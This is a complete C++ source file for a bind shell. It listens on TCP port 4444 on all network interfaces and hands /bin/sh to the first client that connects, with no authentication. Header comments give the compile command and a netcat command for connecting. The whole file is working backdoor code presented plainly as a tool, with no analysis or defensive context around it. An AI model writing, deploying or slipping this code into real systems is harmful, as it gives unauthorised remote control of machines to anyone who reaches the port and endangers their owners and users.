// ============================================================
// bind_shell.cpp — listens on 4444, attaches /bin/sh
// ------------------------------------------------------------
// Compile: clang++ -O2 -o bind bind_shell.cpp
// Run:    ./bind   then connect:  nc 127.0.0.1 4444
// ============================================================
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {
    int l = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(l, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    a.sin_addr.s_addr = INADDR_ANY;
    bind(l, (sockaddr*)&a, sizeof(a));
    listen(l, 1);

    int c = accept(l, nullptr, nullptr);
    dup2(c, 0); dup2(c, 1); dup2(c, 2);
    execl("/bin/sh", "sh", nullptr);
    return 0;
}
